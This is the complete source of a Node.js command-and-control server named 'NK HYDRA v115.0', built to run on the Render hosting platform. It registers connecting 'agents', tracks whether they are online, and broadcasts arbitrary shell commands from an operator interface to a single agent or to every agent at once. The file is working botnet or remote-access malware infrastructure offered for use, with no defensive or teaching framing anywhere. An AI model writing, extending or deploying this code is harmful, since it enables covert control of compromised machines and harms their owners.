// TYPE: NODE.JS C2 SERVER (RUN ON RENDER)
// NK HYDRA v115.0 [REACTOR CORE]

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());

app.get('/', (req, res) => { res.send('HYDRA C2 v115.0 [REACTOR CORE]'); });

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*", methods: ["GET", "POST"] },
    // v115: Configured for unstable networks
    pingInterval: 25000, 
    pingTimeout: 120000, 
    transports: ['polling', 'websocket']
});

let agents = []; 

io.on('connection', (socket) => {
    // Debug log for connection
    // console.log(`[+] New Connection: ${socket.id} via ${socket.conn.transport.name}`);

    socket.on('identify', (data) => {
        // UI does NOT get added to agents list
        if (data.type === 'ui') {
            socket.join('ui_room');
            socket.emit('agents_list', agents);
            return;
        }

        console.log(`[+] Agent Identified: ${data.id}`);
        
        const existingIndex = agents.findIndex(a => a.id === data.id);
        if (existingIndex > -1) {
            agents[existingIndex].socketId = socket.id;
            agents[existingIndex].status = 'Online';
            agents[existingIndex].lastSeen = Date.now();
        } else {
            agents.push({ 
                ...data, 
                socketId: socket.id, 
                status: 'Online', 
                lastSeen: Date.now() 
            });
        }
        
        io.to('ui_room').emit('agents_list', agents);
        io.to('ui_room').emit('agent_event', {
            type: 'SYSTEM',
            agentId: 'CORE',
            payload: `NEW NODE LINKED: ${data.id}`
        });
    });
    
    // v115: Keepalive handler
    socket.on('ping_keepalive', (data) => {
        // Just keeps the connection hot
    });

    socket.on('exec_cmd', (data) => {
        const { targetId, cmd } = data;
        console.log(`[CMD] ${cmd} -> ${targetId}`);
        
        io.to('ui_room').emit('agent_event', { type: 'INFO', agentId: 'C2', payload: `TX: ${cmd}` });

        if (targetId === 'all') {
            io.emit('exec_cmd', { cmd });
        } else {
            const target = agents.find(a => a.id === targetId);
            if (target) {
                io.to(target.socketId).emit('exec_cmd', { cmd });
            }
        }
    });
    
    socket.on('agent_event', (data) => {
        io.to('ui_room').emit('agent_event', data);
    });

    socket.on('disconnect', () => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) { 
            agent.status = 'Offline'; 
            io.to('ui_room').emit('agents_list', agents);
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`HYDRA v115 LISTENING ON ${PORT}`));

